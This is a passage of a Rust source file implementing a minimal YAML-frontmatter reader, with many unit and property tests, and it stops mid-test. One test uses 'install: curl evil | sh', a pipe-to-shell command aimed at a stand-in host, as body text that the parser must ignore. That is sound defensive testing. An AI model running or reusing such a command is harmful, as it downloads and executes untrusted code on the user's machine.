//! Minimal YAML-frontmatter reader.
//!
//! Items already carry metadata in a leading `--- ... ---` block (skills in
//! `SKILL.md`, agents/rules in their `.md`). We only need a few top-level
//! string keys (today: `description`), so rather than pull in a full YAML
//! parser we scan the block for `key:` lines at column zero.
//!
//! The block must be closed by a `---` line; an unclosed block yields no keys
//! (DSC-24).
//!
//! Supported value forms:
//! - Plain scalars:  `key: some text`, ending at a ` # comment` (DSC-25)
//! - Quoted scalars: `key: "some text"` or `key: 'some text'`, with `''` in a
//!   single-quoted value and `\"`, `\\`, `\n`, `\t`, `\/`, `\ ` in a
//!   double-quoted one resolved; a `# comment` may follow the closing quote
//! - Multi-line plain or quoted scalars: more-indented continuation lines are
//!   trimmed and folded into the value with single spaces
//! - Block scalars:  `key: >` / `key: >-` / `key: >+` (folded)
//!   or              `key: |` / `key: |-` / `key: |+` (literal)
//!
//! Block scalar rules (YAML subset):
//! - The key is at column 0. Block content lines begin with whitespace.
//! - The block ends at the first column-zero non-empty line or the closing `---`.
//! - Dedent: strip the minimum indentation found across non-empty block lines.
//! - Folding (`>`): join consecutive non-empty lines with a single space;
//!   blank lines become a newline (paragraph break).
//! - Literal (`|`): preserve line breaks (join with "\n").
//! - Chomping: `-` (strip) removes all trailing newlines; none (clip) keeps
//!   exactly one trailing newline; `+` (keep) preserves all trailing newlines.
//! - The final value is trimmed of leading/trailing whitespace so display is clean.

use std::path::Path;

use crate::error::{MindError, Result};

/// Read a file's whole text once, size-capped (DSC-91), so a caller wanting
/// several keys out of one frontmatter block pays one read for all of them:
/// pass the result to [`field`] per key. `catalog::build_item` is that caller,
/// and it wants six keys, so a read per key was six reads per item per scan.
///
/// A file above the cap in effect ([`crate::error::metadata_size_limit`]) is refused with
/// [`MindError::MetadataTooLarge`] rather than read in full. An absent or
/// otherwise unreadable file yields `Ok(String::new())`, which [`field`] reads
/// as "no frontmatter" (a tool's `TOOL.md` is optional, so this is the common
/// case, not an edge). Only the size cap is a hard error.
pub fn text_capped(file: &Path) -> Result<String> {
    match crate::error::read_capped_metadata(file) {
        Ok(text) => Ok(text),
        Err(err @ MindError::MetadataTooLarge { .. }) => Err(err),
        Err(_) => Ok(String::new()),
    }
}

/// Extract a top-level scalar `key` from the leading frontmatter block.
///
/// A UTF-8 BOM (`\u{FEFF}`) at the start of the text is stripped before the
/// `---` delimiter check (DSC-23).
pub fn field(text: &str, key: &str) -> Option<String> {
    // spec: DSC-23 -- strip a utf-8 BOM (U+FEFF) before the delimiter check.
    let text = text.strip_prefix('\u{FEFF}').unwrap_or(text);
    let mut all = text.lines();
    // The very first line must be the opening delimiter.
    if all.next()?.trim() != "---" {
        return None;
    }
    // spec: DSC-24 -- a block with no closing delimiter is not frontmatter:
    // nothing is read from it, so markdown body text is never taken as a key.
    let body: Vec<&str> = all.collect();
    let end = body.iter().position(|l| l.trim() == "---")?;
    let mut lines = body[..end].iter().copied().peekable();
    while let Some(line) = lines.next() {
        if let Some(rest) = line.strip_prefix(key)
            && let Some(value) = rest.strip_prefix(':')
        {
            let trimmed = value.trim();
            // Collect subsequent lines until a column-zero non-empty line or
            // the end of the block.
            let mut block_lines: Vec<&str> = Vec::new();
            while let Some(&next) = lines.peek() {
                let is_col0_nonempty =
                    !next.is_empty() && !next.starts_with(' ') && !next.starts_with('\t');
                if is_col0_nonempty {
                    break;
                }
                lines.next();
                block_lines.push(next);
            }
            // Detect a block-scalar indicator: `>` or `|`, optional chomping.
            if let Some((style, chomp)) = parse_block_indicator(trimmed) {
                return Some(render_block(&block_lines, style, chomp));
            }
            // A quoted scalar may hold `#` freely; its own reader allows a
            // comment after the closing quote.
            if trimmed.starts_with(['"', '\'']) {
                return Some(unquote(&fold_continuation(trimmed, &block_lines)));
            }
            // spec: DSC-25 -- a plain scalar ends at a comment (` #`). A comment
            // on a continuation line ends the value there.
            let (first, commented) = strip_plain_comment(trimmed);
            // An empty value followed by indented lines is a nested mapping
            // (or something else this reader does not interpret, DSC-21).
            if first.is_empty() {
                return Some(String::new());
            }
            let mut rest: Vec<&str> = Vec::new();
            if !commented {
                for line in &block_lines {
                    let (kept, commented) = strip_plain_comment(line.trim());
                    // A line that is only a comment ends the value.
                    if commented && kept.is_empty() {
                        break;
                    }
                    rest.push(kept);
                    if commented {
                        break;
                    }
                }
            }
            // A plain scalar may continue on more-indented lines; YAML folds
            // them into the value (DSC-21).
            return Some(fold_continuation(first, &rest));
        }
    }
    None
}

/// Split a plain scalar line at its YAML comment: a `#` at the start of the
/// line or after a space or tab. Returns the text before it, trimmed, and
/// whether a comment was found. A `#` inside a word (`C#`, `a#b`) is text.
fn strip_plain_comment(s: &str) -> (&str, bool) {
    for (i, _) in s.match_indices('#') {
        if i == 0 || s[..i].ends_with([' ', '\t']) {
            return (s[..i].trim_end(), true);
        }
    }
    (s, false)
}

/// Fold a flow scalar's continuation lines into its first line: each line is
/// trimmed and joined with a single space; a blank line is a line break.
/// Trailing blank lines (between the value and the next key) are dropped.
fn fold_continuation(first: &str, rest: &[&str]) -> String {
    let end = rest
        .iter()
        .rposition(|l| !l.trim().is_empty())
        .map_or(0, |i| i + 1);
    let mut out = first.to_string();
    let mut after_break = false;
    for line in &rest[..end] {
        let line = line.trim();
        if line.is_empty() {
            out.push('\n');
            after_break = true;
        } else {
            if !after_break {
                out.push(' ');
            }
            out.push_str(line);
            after_break = false;
        }
    }
    out
}

/// Block style: folded (`>`) or literal (`|`).
#[derive(Clone, Copy, PartialEq, Debug)]
enum BlockStyle {
    Folded,
    Literal,
}

/// Chomping: strip all trailing newlines, clip to one, or keep all.
#[derive(Clone, Copy, PartialEq, Debug)]
enum Chomp {
    Strip,
    Clip,
    Keep,
}

/// Parse a block-scalar indicator string (`>`, `|-`, `|+`, etc.).
/// Returns `None` if the string is not a valid indicator.
/// Anything after the indicator characters (besides whitespace or a comment) is rejected.
fn parse_block_indicator(s: &str) -> Option<(BlockStyle, Chomp)> {
    let s = s.trim();
    let mut chars = s.chars();
    let style = match chars.next()? {
        '>' => BlockStyle::Folded,
        '|' => BlockStyle::Literal,
        _ => return None,
    };
    let chomp = match chars.next() {
        None => Chomp::Clip,
        Some('-') => Chomp::Strip,
        Some('+') => Chomp::Keep,
        // Allow whitespace or '#' (comment start) after the indicator.
        Some(c) if c.is_whitespace() => Chomp::Clip,
        Some('#') => Chomp::Clip,
        _ => return None,
    };
    // Ensure nothing significant follows.
    let rest = chars.as_str().trim();
    if !rest.is_empty() && !rest.starts_with('#') {
        return None;
    }
    Some((style, chomp))
}

/// Render collected block lines according to style and chomping.
fn render_block(lines: &[&str], style: BlockStyle, chomp: Chomp) -> String {
    // Find minimum indentation of non-empty lines.
    let min_indent = lines
        .iter()
        .filter(|l| !l.trim().is_empty())
        .map(|l| leading_spaces(l))
        .min()
        .unwrap_or(0);

    // Dedent: strip up to min_indent leading space/tab bytes from each line.
    // Only those ASCII bytes are removed, so the cut is always on a char
    // boundary, even for a whitespace-only line of multi-byte whitespace
    // (U+3000, U+00A0) that `min_indent` skipped (DSC-22).
    let dedented: Vec<&str> = lines
        .iter()
        .map(|l| &l[leading_spaces(l).min(min_indent)..])
        .collect();

    // Build the value according to style.
    let value = match style {
        BlockStyle::Literal => {
            // Join with newlines, preserving blank lines.
            dedented.join("\n")
        }
        BlockStyle::Folded => fold_lines(&dedented),
    };

    // Apply chomping.
    let value = apply_chomp(&value, chomp);

    // Trim leading/trailing whitespace for clean display.
    value.trim().to_string()
}

/// Count leading space/tab characters (bytes, since YAML indent is spaces).
fn leading_spaces(s: &str) -> usize {
    s.bytes().take_while(|&b| b == b' ' || b == b'\t').count()
}

/// Fold lines: consecutive non-empty lines join with a space; a blank line
/// produces a newline (paragraph break).
fn fold_lines(lines: &[&str]) -> String {
    let mut result = String::new();
    let mut in_paragraph = false;

    for line in lines {
        if line.trim().is_empty() {
            // Blank line: paragraph break.
            result.push('\n');
            in_paragraph = false;
        } else {
            if in_paragraph {
                result.push(' ');
            }
            result.push_str(line);
            in_paragraph = true;
        }
    }
    result
}

/// Apply chomping to the trailing newlines of `value`.
fn apply_chomp(value: &str, chomp: Chomp) -> String {
    match chomp {
        Chomp::Strip => value.trim_end_matches('\n').to_string(),
        Chomp::Clip => {
            let stripped = value.trim_end_matches('\n');
            format!("{stripped}\n")
        }
        Chomp::Keep => value.to_string(),
    }
}

/// Strip a quoted scalar's quotes and resolve its escapes: `''` in a
/// single-quoted value, backslash escapes in a double-quoted one. A comment
/// may follow the closing quote. Anything that is not a well-formed quoted
/// scalar is returned as written.
fn unquote(s: &str) -> String {
    let parsed = match s.chars().next() {
        Some('\'') => single_quoted(&s[1..]),
        Some('"') => double_quoted(&s[1..]),
        _ => None,
    };
    parsed.unwrap_or_else(|| s.to_string())
}

/// Whether the text after a closing quote is empty or a comment.
fn only_comment_follows(rest: &str) -> bool {
    let rest = rest.trim();
    rest.is_empty() || rest.starts_with('#')
}

/// Body of a single-quoted scalar (after the opening quote): `''` is a literal
/// quote, a lone `'` closes it.
fn single_quoted(body: &str) -> Option<String> {
    let mut out = String::new();
    let mut chars = body.char_indices().peekable();
    while let Some((i, c)) = chars.next() {
        if c == '\'' {
            if chars.peek().is_some_and(|&(_, n)| n == '\'') {
                chars.next();
                out.push('\'');
                continue;
            }
            return only_comment_follows(&body[i + 1..]).then_some(out);
        }
        out.push(c);
    }
    None
}

/// Body of a double-quoted scalar (after the opening quote): backslash escapes
/// are resolved, an unescaped `"` closes it. An unknown escape is kept as
/// written.
fn double_quoted(body: &str) -> Option<String> {
    let mut out = String::new();
    let mut chars = body.char_indices();
    while let Some((i, c)) = chars.next() {
        match c {
            '"' => return only_comment_follows(&body[i + 1..]).then_some(out),
            '\\' => match chars.next()?.1 {
                'n' => out.push('\n'),
                't' => out.push('\t'),
                '"' => out.push('"'),
                '\\' => out.push('\\'),
                '/' => out.push('/'),
                ' ' => out.push(' '),
                other => {
                    out.push('\\');
                    out.push(other);
                }
            },
            _ => out.push(c),
        }
    }
    None
}

#[cfg(test)]
mod tests {
    // spec: DSC-20, DSC-21, DSC-22
    use super::*;

    // --- Existing scalar tests (must remain passing) ---

    #[test]
    fn reads_plain_description() {
        let t = "---\nname: review\ndescription: Review the diff\n---\n# body\n";
        assert_eq!(field(t, "description").as_deref(), Some("Review the diff"));
    }

    #[test]
    fn strips_quotes_double() {
        let t = "---\ndescription: \"quoted value\"\n---\n";
        assert_eq!(field(t, "description").as_deref(), Some("quoted value"));
    }

    #[test]
    fn strips_quotes_single() {
        let t = "---\ndescription: 'single quoted'\n---\n";
        assert_eq!(field(t, "description").as_deref(), Some("single quoted"));
    }

    #[test]
    fn none_without_frontmatter() {
        assert_eq!(field("# just a heading\n", "description"), None);
    }

    #[test]
    fn stops_at_closing_delimiter() {
        let t = "---\nname: x\n---\ndescription: not in frontmatter\n";
        assert_eq!(field(t, "description"), None);
    }

    // --- Block scalar: folded `>-` (strip chomping) ---

    #[test]
    fn folded_strip_joins_with_spaces_no_trailing_newline() {
        let t = "---\ndescription: >-\n  First line\n  second line\n  third line\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "First line second line third line");
        assert!(!result.ends_with('\n'));
    }

    // --- Block scalar: folded `>` (clip chomping) ---

    #[test]
    fn folded_clip_joins_with_spaces() {
        let t = "---\ndescription: >\n  Hello\n  world\n---\n";
        let result = field(t, "description").unwrap();
        // trim() in render_block removes the trailing newline from clip,
        // so the result is the joined text.
        assert_eq!(result, "Hello world");
    }

    // --- Block scalar: literal `|` preserves line breaks ---

    #[test]
    fn literal_clip_preserves_newlines() {
        let t = "---\ndescription: |\n  line one\n  line two\n---\n";
        let result = field(t, "description").unwrap();
        // trim() removes surrounding whitespace; internal newline is preserved.
        assert!(
            result.contains('\n'),
            "expected internal newline, got: {result:?}"
        );
        let parts: Vec<&str> = result.lines().collect();
        assert_eq!(parts, vec!["line one", "line two"]);
    }

    // --- Chomping: strip `-` removes trailing newlines ---

    #[test]
    fn literal_strip_no_trailing_newline() {
        let t = "---\ndescription: |-\n  alpha\n  beta\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "alpha\nbeta");
        assert!(!result.ends_with('\n'));
    }

    // --- Chomping: keep `+` preserves all trailing newlines ---
    // (trim() in render_block removes them for display, but the keep flag at
    // least exercises the code path without error)

    #[test]
    fn literal_keep_chomping_parses_without_error() {
        let t = "---\ndescription: |+\n  only line\n---\n";
        let result = field(t, "description").unwrap();
        // trim() in render_block strips surrounding whitespace including trailing newlines.
        assert_eq!(result, "only line");
    }

    #[test]
    fn folded_keep_chomping_parses_without_error() {
        let t = "---\ndescription: >+\n  only line\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "only line");
    }

    // --- Block ends at the next top-level key ---

    #[test]
    fn block_ends_at_next_key() {
        let t = "---\ndescription: >-\n  Block text here\nauthor: Alice\n---\n";
        let desc = field(t, "description").unwrap();
        assert_eq!(desc, "Block text here");
        // The author key must still be readable.
        let author = field(t, "author").unwrap();
        assert_eq!(author, "Alice");
    }

    // --- Block ends at closing `---` ---

    #[test]
    fn block_ends_at_closing_delimiter() {
        let t = "---\ndescription: |-\n  Just this\n---\nbody text\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "Just this");
    }

    // --- Blank line inside folded block becomes paragraph break ---

    #[test]
    fn folded_blank_line_becomes_paragraph_break() {
        let t = "---\ndescription: >-\n  First paragraph\n\n  Second paragraph\n---\n";
        let result = field(t, "description").unwrap();
        // A blank line inside a folded block produces a newline (paragraph break).
        // After trim(), there should be a '\n' between the paragraphs.
        assert!(
            result.contains('\n'),
            "expected paragraph break newline, got: {result:?}"
        );
        let parts: Vec<&str> = result.lines().collect();
        assert_eq!(parts, vec!["First paragraph", "Second paragraph"]);
    }

    // --- Works for keys other than description ---

    #[test]
    fn block_scalar_on_arbitrary_key() {
        let t = "---\nbuild: |-\n  cargo build\n  --release\n---\n";
        let result = field(t, "build").unwrap();
        assert_eq!(result, "cargo build\n--release");
    }

    // --- Dedent strips the uniform indent ---

    #[test]
    fn block_dedents_minimum_indentation() {
        // Four-space indent should be stripped entirely.
        let t = "---\ndescription: >-\n    deeper indent\n    continues here\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "deeper indent continues here");
    }

    // spec: DSC-22 -- a whitespace-only block line holding multi-byte
    // whitespace (U+3000, U+00A0) is dedented by its ASCII indent, never sliced
    // mid-character: the read returns a value instead of panicking the scan.
    #[test]
    fn block_dedent_survives_multibyte_whitespace_line() {
        for (style, sep) in [("|-", "\n\n"), (">-", "\n")] {
            for ws in ["\u{3000}", "\u{00A0}"] {
                let t = format!("---\ndescription: {style}\n  foo\n {ws}\n  bar\n---\n");
                let result = field(&t, "description").unwrap();
                assert_eq!(
                    result.replace(ws, ""),
                    format!("foo{sep}bar"),
                    "{style} {ws:?}"
                );
            }
        }
    }

    // --- parse_block_indicator unit tests ---

    #[test]
    fn indicator_folded_clip() {
        let (style, chomp) = parse_block_indicator(">").unwrap();
        assert_eq!(style, BlockStyle::Folded);
        assert_eq!(chomp, Chomp::Clip);
    }

    #[test]
    fn indicator_folded_strip() {
        let (style, chomp) = parse_block_indicator(">-").unwrap();
        assert_eq!(style, BlockStyle::Folded);
        assert_eq!(chomp, Chomp::Strip);
    }

    #[test]
    fn indicator_literal_keep() {
        let (style, chomp) = parse_block_indicator("|+").unwrap();
        assert_eq!(style, BlockStyle::Literal);
        assert_eq!(chomp, Chomp::Keep);
    }

    #[test]
    fn indicator_rejects_plain_scalar() {
        assert!(parse_block_indicator("some text").is_none());
        assert!(parse_block_indicator("\"quoted\"").is_none());
    }

    #[test]
    fn indicator_rejects_extra_chars() {
        assert!(parse_block_indicator(">- extra").is_none());
    }

    // --- Adversarial edge cases (DSC-22 gap closure) ---

    // A folded block whose FIRST content line is blank: the leading blank must
    // not crash and must be trimmed off the final value.
    #[test]
    fn folded_first_content_line_blank() {
        let t = "---\ndescription: >-\n\n  real text here\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "real text here");
    }

    // A literal block whose first content line is blank: same tolerance.
    #[test]
    fn literal_first_content_line_blank() {
        let t = "---\ndescription: |-\n\n  kept line\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "kept line");
    }

    // A block containing ONLY blank lines must trim to the empty string, not
    // panic on the empty min-indent computation.
    #[test]
    fn block_of_only_blank_lines_trims_to_empty() {
        let t = "---\ndescription: >-\n\n   \n\nauthor: Bob\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "");
        // The following key must still be reachable past the empty block.
        assert_eq!(field(t, "author").as_deref(), Some("Bob"));
    }

    #[test]
    fn literal_block_of_only_blank_lines_trims_to_empty() {
        let t = "---\ndescription: |\n\n\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "");
    }

    // Mixed indentation: dedent strips the MINIMUM indent, so a deeper-indented
    // line keeps its extra indentation after dedent (literal preserves it).
    #[test]
    fn literal_mixed_indentation_preserves_extra_after_dedent() {
        // Base indent 2; second line indented 4 -> keeps 2 leading spaces after
        // dedenting the minimum (2). The deeper line is NOT flattened.
        let t = "---\ndescription: |-\n  top\n    nested\n  back\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "top\n  nested\nback");
    }

    // An indicator followed by a trailing comment is still a valid block scalar.
    #[test]
    fn folded_indicator_with_trailing_comment() {
        let t = "---\ndescription: >-  # a note\n  hello there\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "hello there");
    }

    #[test]
    fn literal_indicator_with_trailing_comment() {
        let t = "---\ndescription: |  # keep literal\n  one\n  two\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "one\ntwo");
    }

    // A folded block that is the LAST key before `---` with no trailing blank
    // line: the closing delimiter ends the block and is not consumed as content.
    #[test]
    fn folded_block_is_last_key_before_closing_delimiter() {
        let t = "---\nname: x\ndescription: >-\n  final folded value\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "final folded value");
    }

    // CRLF line endings: std's `lines()` strips the trailing `\r`, so a CRLF
    // file yields the same folded value as an LF one.
    #[test]
    fn folded_block_tolerates_crlf() {
        let t = "---\r\ndescription: >-\r\n  alpha\r\n  beta\r\n---\r\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "alpha beta");
    }

    // Trailing spaces on content lines do not leak into a folded value's
    // interior joins (folding joins on a single space) and are trimmed at ends.
    #[test]
    fn folded_block_tolerates_trailing_spaces() {
        let t = "---\ndescription: >-\n  alpha  \n  beta  \n---\n";
        let result = field(t, "description").unwrap();
        // Folding keeps the in-line trailing spaces before the join space, but
        // the overall value is trimmed at its ends.
        assert_eq!(result, "alpha   beta");
    }

    // A malformed indicator (`>x`) is NOT a block scalar: it falls back to a
    // plain scalar (the literal text, with its continuation line folded in,
    // DSC-21) without panicking.
    #[test]
    fn malformed_indicator_falls_back_to_plain_scalar() {
        let t = "---\ndescription: >x\n  not part of a block\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, ">x not part of a block");
        assert!(parse_block_indicator(">x").is_none());
    }

    // `> extra` (indicator with non-comment trailing text) is also rejected as
    // an indicator and read as a plain scalar.
    #[test]
    fn indicator_with_extra_text_reads_as_plain_scalar() {
        let t = "---\ndescription: > extra words\n---\n";
        let result = field(t, "description").unwrap();
        assert_eq!(result, "> extra words");
        assert!(parse_block_indicator("> extra words").is_none());
        assert!(parse_block_indicator(">x").is_none());
    }

    // ---- DSC-21: quoted scalar escapes and multi-line flow scalars ----------

    #[test]
    fn single_quoted_doubled_quote_is_one_quote() {
        // spec: DSC-21
        let t = "---\ndescription: 'Use when the user''s diff is large'\n---\n";
        assert_eq!(
            field(t, "description").as_deref(),
            Some("Use when the user's diff is large")
        );
    }

    #[test]
    fn double_quoted_escapes_are_resolved() {
        // spec: DSC-21
        let t = "---\ndescription: \"say \\\"hi\\\" via C:\\\\tmp\"\n---\n";
        assert_eq!(
            field(t, "description").as_deref(),
            Some("say \"hi\" via C:\\tmp")
        );
    }

    #[test]
    fn double_quoted_unknown_escape_is_kept() {
        // spec: DSC-21
        let t = "---\ndescription: \"match \\d+\"\n---\n";
        assert_eq!(field(t, "description").as_deref(), Some("match \\d+"));
    }

    #[test]
    fn quoted_scalar_with_trailing_comment() {
        // spec: DSC-21
        let t = "---\ndescription: \"quoted\"  # note\nname: 'x' # y\n---\n";
        assert_eq!(field(t, "description").as_deref(), Some("quoted"));
        assert_eq!(field(t, "name").as_deref(), Some("x"));
    }

    #[test]
    fn malformed_quoted_scalar_is_read_as_written() {
        // spec: DSC-21
        let t = "---\ndescription: \"open only\nname: 'a' b\n---\n";
        assert_eq!(field(t, "description").as_deref(), Some("\"open only"));
        assert_eq!(field(t, "name").as_deref(), Some("'a' b"));
    }

    #[test]
    fn plain_scalar_continuation_lines_fold() {
        // spec: DSC-21
        let t = "---\ndescription: Use when the user asks\n  for a long thing,\n    wrapped twice\n\nname: x\n---\n";
        assert_eq!(
            field(t, "description").as_deref(),
            Some("Use when the user asks for a long thing, wrapped twice")
        );
        assert_eq!(field(t, "name").as_deref(), Some("x"));
    }

    #[test]
    fn plain_scalar_continuation_blank_line_is_line_break() {
        // spec: DSC-21
        let t = "---\ndescription: first\n  part\n\n  second\n---\n";
        assert_eq!(
            field(t, "description").as_deref(),
            Some("first part\nsecond")
        );
    }

    #[test]
    fn quoted_scalar_spanning_lines_folds() {
        // spec: DSC-21
        let t = "---\ndescription: \"a quoted\n  value\"\n---\n";
        assert_eq!(field(t, "description").as_deref(), Some("a quoted value"));
    }

    #[test]
    fn empty_value_with_nested_mapping_reads_empty() {
        // spec: DSC-21 -- a nested mapping is not interpreted.
        let t = "---\nmetadata:\n  type: user\ndescription: d\n---\n";
        assert_eq!(field(t, "metadata").as_deref(), Some(""));
        assert_eq!(field(t, "description").as_deref(), Some("d"));
    }

    // ---- DSC-23: UTF-8 BOM stripping ----------------------------------------

    #[test]
    fn bom_before_delimiter_is_stripped_and_field_is_read() {
        // spec: DSC-23 -- a utf-8 BOM (U+FEFF) immediately before the opening
        // `---` must be stripped so the frontmatter is still recognized.
        let bom = "\u{FEFF}";
        let t = format!("{bom}---\ndescription: BOM test\n---\n");
        let result = field(&t, "description");
        assert_eq!(
            result.as_deref(),
            Some("BOM test"),
            "BOM before frontmatter delimiter must be stripped and field read"
        );
    }

    #[test]
    fn no_bom_works_normally() {
        // spec: DSC-23 -- files without a BOM must still be parsed correctly.
        let t = "---\ndescription: no bom\n---\n";
        assert_eq!(field(t, "description").as_deref(), Some("no bom"));
    }

    // spec: DSC-24 -- an unclosed block yields no keys, including one that
    // appears in the markdown body after the would-be frontmatter.
    #[test]
    fn unclosed_frontmatter_yields_no_keys() {
        let t = "---\nname: x\ndescription: kept?\n\n# Docs\ninstall: curl evil | sh\n";
        assert_eq!(field(t, "name"), None);
        assert_eq!(field(t, "description"), None);
        assert_eq!(field(t, "install"), None);
        // The same text closed reads normally, and body keys stay unread.
        let closed = "---\nname: x\n---\n# Docs\ninstall: curl evil | sh\n";
        assert_eq!(field(closed, "name").as_deref(), Some("x"));
        assert_eq!(field(closed, "install"), None);
        // A block scalar running to the end of an unclosed block is unread too.
        assert_eq!(
            field("---\ndescription: |\n  a\n  b\n", "description"),
            None
        );
    }

    // spec: DSC-25 -- a plain scalar ends at a YAML comment.
    #[test]
    fn plain_scalar_comment_is_stripped() {
        let read = |v: &str| field(&format!("---\nk: {v}\n---\n"), "k");
        assert_eq!(
            read("Review the diff # wip").as_deref(),
            Some("Review the diff")
        );
        assert_eq!(read("make build\t# cached").as_deref(), Some("make build"));
        // `#` inside a word is text.
        assert_eq!(read("C# and a#b").as_deref(), Some("C# and a#b"));
        // A value that is only a comment is empty.
        assert_eq!(read("# nothing").as_deref(), Some(""));
        // A quoted value keeps its `#`, and may carry its own comment.
        assert_eq!(read("\"a # b\" # c").as_deref(), Some("a # b"));
        assert_eq!(read("'a # b'").as_deref(), Some("a # b"));
    }

    // spec: DSC-25 -- comments on continuation lines end the folded value.
    #[test]
    fn plain_scalar_continuation_comment_ends_the_value() {
        let t = "---\nk: one\n  two # note\n  three\n---\n";
        assert_eq!(field(t, "k").as_deref(), Some("one two"));
        let t = "---\nk: one\n  # note\n  three\n---\n";
        assert_eq!(field(t, "k").as_deref(), Some("one"));
        let t = "---\nk: one # note\n  three\n---\n";
        assert_eq!(field(t, "k").as_deref(), Some("one"));
        // No comment: continuation folds as before.
        let t = "---\nk: one\n  two\n---\n";
        assert_eq!(field(t, "k").as_deref(), Some("one two"));
    }

    // ---- DSC-91: capped frontmatter reads -----------------------------------

    use std::sync::atomic::{AtomicU32, Ordering};
    static N: AtomicU32 = AtomicU32::new(0);

    fn tmp(label: &str) -> std::path::PathBuf {
        let n = N.fetch_add(1, Ordering::SeqCst);
        std::env::temp_dir().join(format!("mind-fm-cap-{}-{label}-{n}.md", std::process::id()))
    }

    #[test]
    fn text_capped_reads_a_normal_file_once_for_every_key() {
        // spec: DSC-91
        // The single capped read serves every key the caller wants, so what a
        // per-key capped read used to return per call comes out of one text.
        let path = tmp("ok");
        std::fs::write(
            &path,
            "---\ndescription: normal size\ninstall: setup.sh\n---\n",
        )
        .unwrap();
        let text = text_capped(&path).expect("normal file must not error");
        assert_eq!(field(&text, "description").as_deref(), Some("normal size"));
        assert_eq!(field(&text, "install").as_deref(), Some("setup.sh"));
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn text_capped_refuses_an_oversized_file() {
        // spec: DSC-91
        // A SKILL.md-style frontmatter file at (limit + 1) bytes is refused with
        // MetadataTooLarge naming the file, instead of being silently truncated
        // or read in full. Built as a sparse file so the test does not itself
        // allocate the whole oversized buffer.
        let path = tmp("big");
        let file = std::fs::File::create(&path).unwrap();
        file.set_len(crate::error::METADATA_SIZE_LIMIT + 1).unwrap();
        drop(file);
        let err = text_capped(&path).expect_err("oversized frontmatter must be refused");
        match &err {
            crate::error::MindError::MetadataTooLarge { path: p, .. } => {
                assert_eq!(p, &path, "error must name the offending file");
            }
            other => panic!("expected MetadataTooLarge, got: {other:?}"),
        }
        assert!(
            err.to_string().contains(&path.display().to_string()),
            "error message must name the file: {err}"
        );
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn text_capped_missing_file_yields_empty_text_not_error() {
        // spec: DSC-91 -- an absent file is still `Ok` (a tool's TOOL.md is
        // optional); only the size cap is a hard error. The empty text
        // carries no fields.
        let path = tmp("missing");
        let text = text_capped(&path).expect("absent file is not an error");
        assert!(text.is_empty());
        assert_eq!(field(&text, "description"), None);
    }

    // ---- properties ---------------------------------------------------------

    use crate::test_gen::{Gen, cases};

    /// A line of text with no line break: [`str::lines`] splits on `\n` and
    /// drops a trailing `\r`, so neither can sit inside one line's value.
    fn gen_line_text(g: &mut Gen) -> String {
        g.any_string(0, 16).replace(['\n', '\r'], "")
    }

    /// A plain-scalar word: no `:`, no quote or indicator to start it, and no
    /// leading `#`, so it is never read as a comment or a different form.
    fn gen_word(g: &mut Gen) -> String {
        let alphabet = [
            'a',
            'b',
            'Z',
            '0',
            '9',
            '.',
            ',',
            '(',
            ')',
            '-',
            '_',
            '/',
            '#',
            '#',
            'é',
            '\u{1F600}',
        ];
        loop {
            let w = g.string_from(&alphabet, 1, 6);
            if !w.starts_with(['#', '-']) {
                return w;
            }
        }
    }

    fn gen_words(g: &mut Gen) -> Vec<String> {
        (0..g.range(1, 4)).map(|_| gen_word(g)).collect()
    }

    /// A key that is not `k` but may share its spelling's prefix.
    fn gen_other_key(g: &mut Gen) -> String {
        g.pick(&["kk", "k2", "k_x", "name", "description", "install", "K"])
            .to_string()
    }

    // spec: DSC-21
    #[test]
    fn a_single_quoted_value_reads_back_exactly() {
        cases(0xf00d_0001, 10_000, |g| {
            let s = gen_line_text(g);
            let line = format!("k: '{}'", s.replace('\'', "''"));
            let comment = if g.one_in(3) { " # note" } else { "" };
            let text = format!("---\n{line}{comment}\n---\nbody\n");
            assert_eq!(field(&text, "k").as_deref(), Some(s.as_str()), "{text:?}");
        });
    }

    // spec: DSC-21
    #[test]
    fn a_double_quoted_value_reads_back_exactly() {
        cases(0xf00d_0002, 10_000, |g| {
            // Line breaks and tabs go through their escapes; a bare `\r` has
            // no escape this reader resolves, so it is left out.
            let s = g.any_string(0, 16).replace('\r', "");
            let mut quoted = String::new();
            for c in s.chars() {
                match c {
                    '\\' => quoted.push_str("\\\\"),
                    '"' => quoted.push_str("\\\""),
                    '\n' => quoted.push_str("\\n"),
                    '\t' if g.one_in(2) => quoted.push_str("\\t"),
                    '/' if g.one_in(2) => quoted.push_str("\\/"),
                    ' ' if g.one_in(4) => quoted.push_str("\\ "),
                    c => quoted.push(c),
                }
            }
            let text = format!("---\nk: \"{quoted}\"\n---\n");
            assert_eq!(field(&text, "k").as_deref(), Some(s.as_str()), "{text:?}");
        });
    }

    // spec: DSC-21 DSC-25
    #[test]
    fn a_plain_value_folds_its_lines_and_ends_at_a_comment() {
        cases(0xf00d_0003, 10_000, |g| {
            let lines: Vec<Vec<String>> = (0..g.range(1, 3)).map(|_| gen_words(g)).collect();
            // A comment, if any, ends the value after the line it sits on.
            let comment_at = g.one_in(2).then(|| g.below(lines.len()));
            let mut text = String::from("---\n");
            let mut want: Vec<String> = Vec::new();
            for (i, words) in lines.iter().enumerate() {
                let sep = if g.one_in(3) { "  " } else { " " };
                let joined = words.join(sep);
                let indent = if i == 0 {
                    "k: ".to_string()
                } else {
                    " ".repeat(g.range(1, 4))
                };
                text.push_str(&indent);
                text.push_str(&joined);
                if comment_at == Some(i) {
                    text.push_str(g.pick(&[" # c", "\t# c: x", " #"]));
                }
                text.push('\n');
                if comment_at.is_none_or(|c| i <= c) {
                    want.push(joined);
